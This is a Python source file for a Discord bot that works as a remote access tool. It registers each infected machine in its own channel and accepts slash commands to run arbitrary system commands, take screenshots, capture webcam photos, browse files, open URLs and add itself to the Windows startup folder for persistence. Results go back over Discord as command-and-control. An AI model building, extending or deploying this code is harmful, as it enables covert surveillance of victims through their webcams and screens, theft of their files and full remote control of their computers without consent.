import discord
from discord.ext import commands
import os
import socket
import asyncio

# Import all your custom modules
import command_executor as cmd
import notification_sender as notifier
import screenshot_taker as ss
import system_info as sysinfo
import web_opener
import startup_manager
import file_explorer as fe
import webcam_manager as wcm # <-- NEW: Import the webcam module

# --- Configuration & Bot Setup (No changes needed here) ---
TOKEN_PATH = 'token.txt'
AUTHORIZED_USERS = [1153459521251983470] 
SERVER_CATEGORY_NAME = "🔴 Live Sessions" 
session_channel = None

class PersistentBot(commands.Bot):
    async def setup_hook(self):
        self.add_view(fe.FileExplorerView())
        print("Persistent views have been registered.")

intents = discord.Intents.default()
intents.message_content = True
bot = PersistentBot(command_prefix='!', intents=intents, help_command=None)

# ... (Helper functions like load_token, get_device_name, is_authorized remain the same) ...
def load_token() -> str:
    if not os.path.exists(TOKEN_PATH):
        raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f:
        return f.read().strip()

def get_device_name() -> str:
    hostname = socket.gethostname()
    return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()

def is_authorized(interaction: discord.Interaction) -> bool:
    global session_channel
    if interaction.user.id not in AUTHORIZED_USERS:
        return False
    if session_channel and interaction.channel.id == session_channel.id:
        return True
    return False
# ... (All previous commands like runcmd, explorer, etc. remain the same) ...
@bot.tree.command(name="runcmd", description="Execute a system command on this device.")
async def runcmd(interaction: discord.Interaction, command: str):
    if not is_authorized(interaction):
        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
    await interaction.response.defer()
    output = cmd.execute_command(command)
    if len(output) > 1900:
        output = output[:1900] + "\n[...TRUNCATED...]"
    await interaction.followup.send(f"```\n📟 COMMAND: {command}\n💻 OUTPUT:\n{output}\n```")

@bot.tree.command(name="shownotification", description="Displays a desktop notification on this device.")
async def shownotification(interaction: discord.Interaction, title: str, message: str):
    if not is_authorized(interaction):
        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
    success = notifier.show(title, message)
    if success:
        await interaction.response.send_message(f"✅ Notification sent: **{title}**")
    else:
        await interaction.response.send_message("❌ Failed to send notification. Check console.")

@bot.tree.command(name="takescreenshot", description="Takes a screenshot of this device.")
async def takescreenshot(interaction: discord.Interaction):
    if not is_authorized(interaction):
        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
    await interaction.response.defer()
    screenshot_file = ss.take_screenshot()
    if screenshot_file and os.path.exists(screenshot_file):
        try:
            await interaction.followup.send(file=discord.File(screenshot_file))
        finally:
            os.remove(screenshot_file)
    else:
        await interaction.followup.send("❌ Failed to take screenshot. Check console for errors.")

@bot.tree.command(name="systemspecs", description="Shows hardware specs of this device.")
async def systemspecs(interaction: discord.Interaction):
    if not is_authorized(interaction):
        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
    await interaction.response.defer()
    specs = sysinfo.get_specs()
    embed = discord.Embed(title=f"💻 System Specifications for {get_device_name()}", color=discord.Color.blue())
    embed.add_field(name="Operating System", value=f"{specs.get('platform', 'N/A')} {specs.get('platform_release', 'N/A')}", inline=False)
    embed.add_field(name="CPU", value=f"{specs.get('cpu_name', 'N/A')}", inline=False)
    embed.add_field(name="CPU Usage", value=f"{specs.get('cpu_usage', 'N/A')}%", inline=True)
    embed.add_field(name="Cores", value=f"{specs.get('cpu_physical_cores', 'N/A')} Physical, {specs.get('cpu_total_cores', 'N/A')} Total", inline=True)
    embed.add_field(name="RAM Usage", value=f"{specs.get('ram_usage_percent', 'N/A')}% ({specs.get('ram_available', 'N/A')} free of {specs.get('ram_total', 'N/A')})", inline=False)
    for i, gpu in enumerate(specs.get('gpus', [])):
        gpu_name = f"GPU {i}: {gpu.get('name', 'Unknown GPU')}"
        gpu_stats = (f"Load: {gpu.get('load', 'N/A')} | "
                     f"Temp: {gpu.get('temperature', 'N/A')} | "
                     f"VRAM: {gpu.get('vram_used', 'N/A')} / {gpu.get('vram_total', 'N/A')}")
        embed.add_field(name=gpu_name, value=gpu_stats, inline=False)
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="openwebsite", description="Opens a URL on this device.")
async def openwebsite(interaction: discord.Interaction, url: str):
    if not is_authorized(interaction):
        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
    success = web_opener.open_url(url)
    if success:
        await interaction.response.send_message(f"✅ Attempted to open `{url}` on the host machine.")
    else:
        await interaction.response.send_message("❌ Failed to open URL. Check console for details.")

@bot.tree.command(name="putinstartup", description="Adds the bot to the system's startup folder (Windows).")
async def putinstartup(interaction: discord.Interaction):
    if not is_authorized(interaction):
        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
    await interaction.response.defer()
    message = startup_manager.add_to_startup()
    await interaction.followup.send(f"`{message}`")

@bot.tree.command(name="remotekill", description="Stops the bot on the remote machine and terminates the session.")
async def remotekill(interaction: discord.Interaction):
    if not is_authorized(interaction):
        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
    await interaction.response.send_message("🔴 **Shutdown command received. Terminating session...**")
    offline_embed = discord.Embed(
        title="🔴 Session Terminated",
        description=f"Device **{get_device_name()}** has been shut down via remote command.",
        color=discord.Color.red()
    )
    if session_channel:
        await session_channel.send(embed=offline_embed)
    await bot.close()

@bot.tree.command(name="explorer", description="Launch an interactive file explorer for this device.")
async def explorer(interaction: discord.Interaction):
    if not is_authorized(interaction):
        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)
    
    await interaction.response.defer()
    
    channel_id = interaction.channel.id
    initial_path = os.path.abspath(os.sep)
    fe.explorer_sessions[channel_id] = initial_path
    
    embed, dirs = fe.create_explorer_embed(initial_path)
    view = fe.FileExplorerView()
    
    view.children[3].callback = view.create_modal_callback(dirs)
    
    await interaction.followup.send(embed=embed, view=view)
# --- NEW WEBCAM COMMAND ---

@bot.tree.command(name="irlpicture", description="Captures an image from the device's webcam.")
async def irlpicture(interaction: discord.Interaction):
    if not is_authorized(interaction):
        return await interaction.response.send_message("⛔ Unauthorized or wrong channel.", ephemeral=True)

    await interaction.response.defer() # Defer publicly

    # Run the blocking I/O operation in an executor to avoid freezing the bot
    image_path = await asyncio.to_thread(wcm.capture_webcam_image)

    if image_path and os.path.exists(image_path):
        try:
            await interaction.followup.send(file=discord.File(image_path))
        finally:
            # Clean up the temporary file from the host machine
            os.remove(image_path)
    else:
        await interaction.followup.send("❌ **Failed to capture image.** No webcam found or an error occurred.")


# --- Connection and Main Loop (No changes needed here) ---
@bot.event
async def on_ready():
    global session_channel
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    
    device_name = get_device_name()
    if not bot.guilds:
        print("Error: Bot is not a member of any guild!")
        return
    guild = bot.guilds[0]

    category = discord.utils.get(guild.categories, name=SERVER_CATEGORY_NAME)
    if not category:
        print(f"Creating category '{SERVER_CATEGORY_NAME}'...")
        category = await guild.create_category(SERVER_CATEGORY_NAME)

    channel = discord.utils.get(guild.text_channels, name=device_name)
    if not channel:
        print(f"Creating channel for device '{device_name}'...")
        channel = await guild.create_text_channel(device_name, category=category)
        
    session_channel = channel
    print(f"Session channel set to #{channel.name} (ID: {channel.id})")
    
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)
        
    online_embed = discord.Embed(
        title="🟢 New Session Started",
        description=f"Device **{device_name}** is now online and ready for commands.",
        color=discord.Color.green()
    )
    await session_channel.send(embed=online_embed)

async def main():
    async with bot:
        try:
            await bot.start(load_token())
        except discord.errors.LoginFailure:
            print("❌ Failed to log in. Please check your token in 'token.txt'")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
    print("Bot session has ended.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        print("\nProgram interrupted. Shutting down.")